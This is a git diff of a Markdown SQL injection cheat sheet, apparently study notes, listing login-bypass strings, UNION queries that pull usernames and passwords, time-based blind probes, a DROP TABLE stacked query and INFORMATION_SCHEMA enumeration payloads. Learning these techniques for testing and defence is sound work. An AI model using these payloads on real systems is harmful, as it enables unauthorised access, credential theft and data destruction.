@@ -4,12 +4,12 @@
 
 | Type | Description | Example | Useful/Where Can't Be Used |
 |------|-------------|---------|----------------------------|
-| Classic | Direct injection into input fields. | `' OR '1'='1` | Useful for basic input fields; can't use if input is sanitized. |
-| Union-Based | Uses UNION operator to extract data. | `' UNION SELECT NULL, username, password --` | Useful with multiple columns; can't use if UNION is blocked. |
-| Error-Based | Exploits database errors to reveal data. | `' AND 1=(SELECT COUNT(*))` | Useful with error messages; can't use if errors are suppressed. |
-| Blind (Boolean)| Infers data via true/false responses. | `' AND SUBSTRING(version(), 1, 1)=5` | Useful when errors are suppressed; can't use if responses are identical. |
-| Blind (Time-Based) | Delays response based on conditions. | `' OR IF(1=1, SLEEP(5), 0)` | Useful with no output; can't use if timing controls are strict. |
-| Stacked Queries | Executes multiple statements. | `'; DROP TABLE users; --` | Useful if multi-queries allowed; can't use if DBMS restricts it. |
+| Classic | Direct injection into input fields | `' OR '1'='1` | Useful for basic input fields; can't use if input is sanitized |
+| Union-Based | Uses UNION operator to extract data | `' UNION SELECT NULL, username, password --` | Useful with multiple columns; can't use if UNION is blocked |
+| Error-Based | Exploits database errors to reveal data | `' AND 1=(SELECT COUNT(*))` | Useful with error messages; can't use if errors are suppressed |
+| Blind (Boolean)| Infers data via true/false responses | `' AND SUBSTRING(version(), 1, 1)=5` | Useful when errors are suppressed; can't use if responses are identical |
+| Blind (Time-Based) | Delays response based on conditions | `' OR IF(1=1, SLEEP(5), 0)` | Useful with no output; can't use if timing controls are strict |
+| Stacked Queries | Executes multiple statements | `'; DROP TABLE users; --` | Useful if multi-queries allowed; can't use if DBMS restricts it |
 
 ## Useful links
 
@@ -29,6 +29,7 @@
 | `USE users;` | Switch to database |
 
 **Note:** SQL statements are not case sensitive but names are.
+
 **Note:** 3306 is the default port for MySQL.
 
 ### Tables
@@ -120,11 +121,11 @@ select * from logins where username like '%1'; DROP TABLE users;--'
 
 | Type                | Description                              | Use Case                        |
 |---------------------|------------------------------------------|---------------------------------|
-| In-band: Union-Based| Direct output via UNION query in specific column. | When output is displayed in a readable column. |
-| In-band: Error-Based| Triggers SQL errors to reveal query output. | When errors are shown on front-end. |
-| Blind: Boolean-Based| Uses true/false conditions to infer data. | When no output but page behavior changes. |
-| Blind: Time-Based   | Delays response with Sleep() to infer data. | When no output or behavior change, but delays detectable. |
-| Out-of-band         | Sends output to remote location (e.g., DNS). | When no direct output is accessible. |
+| In-band: Union-Based| Direct output via UNION query in specific column | When output is displayed in a readable column |
+| In-band: Error-Based| Triggers SQL errors to reveal query output | When errors are shown on front-end |
+| Blind: Boolean-Based| Uses true/false conditions to infer data | When no output but page behavior changes |
+| Blind: Time-Based   | Delays response with Sleep() to infer data | When no output or behavior change, but delays detectable |
+| Out-of-band         | Sends output to remote location (e.g., DNS) | When no direct output is accessible |
 
 **Note:** In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.
 
@@ -146,28 +147,40 @@ MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g.,
 
 | Payload            | Description                     | How It Works                                   |
 |--------------------|---------------------------------|------------------------------------------------|
-| `admin' or '1'='1` | Basic Auth Bypass (works if admin is a valid username) | Appends TRUE condition (`'1'='1`) to bypass login check. |
-| Username:`notadmin' or '1'='1` Password: `something' or '1'='1` | Basic Auth Bypass (works when username not known) | This works since the query evaluate to true irrespective of the username or password. |
-| `admin')-- -`      | Basic Auth Bypass With Comments | Closes query early with `)` and comments out rest with `--`. |
+| `'` | Single quote SQLi check | May return error message | useful to see if vulnerable to SQLi |
+| `admin' or '1'='1` | Basic Auth Bypass (works if admin is a valid username) | Appends TRUE condition (`'1'='1`) to bypass login check |
+| Username:`notadmin' or '1'='1` Password: `something' or '1'='1` | Basic Auth Bypass (works when username not known) | This works since the query evaluate to true irrespective of the username or password |
+| `admin')-- -`      | Basic Auth Bypass With Comments | Closes query early with `)` and comments out rest with `--`, the additional ` -` ensures the comments are activited by forcing a space after them |
 
 [Payload all the things: authentication bypass section](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
 
+**Note:**  Line comments with -- or #, in-line comment with /**/.
+
 ### Union Injection
+
+[Union Clause](https://dev.mysql.com/doc/refman/8.0/en/union.html)
 
 | Payload | Description |
 |---------|-------------|
-| `' order by 1-- -` | Detect number of columns using order by |
-| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
-| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
-| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
+| `' order by 1-- -` | Detect number of columns using order by, increment the integer until error states column does not exist |
+| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection, try a different numbers of columns until we get a success, using numbers as junk data will show which columns are displayed, however data type must match, NULL matches all data types |
+| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection to show DB version, with 'cn' as search query | 
+| `' UNION SELECT 1,user(),3,4-- -` | Basic Union injection to show which user we are making the query as | 
+| `' UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns to get username from the passwords table |
 
 ### DB Enumeration
 
+#### MySQL Fingerprinting
+
+| Payload          | When to Use                  | Expected Output                           | Wrong Output                              |
+|------------------|------------------------------|-------------------------------------------|-------------------------------------------|
+| `SELECT @@version` | Full query output            | MySQL Version (e.g., 10.3.22-MariaDB-1ubuntu1) | MSSQL returns MSSQL version; errors in others. |
+| `SELECT POW(1,1)`  | Numeric output only          | 1                                         | Errors in other DBMS.                     |
+| `SELECT SLEEP(5)`  | Blind/No output              | Delays response 5 seconds, returns 0      | No delay in other DBMS.                   |
+
 | Payload | Description |
 |---------|-------------|
-| `SELECT @@version` | Fingerprint MySQL with query output |
-| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
-| `cn' UNION select 1,database(),2,3-- -` | Current database name |
+| `cn' UNION select 1,database(),2,3-- -` | Current database name  |
 | `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
 | `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
 | `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
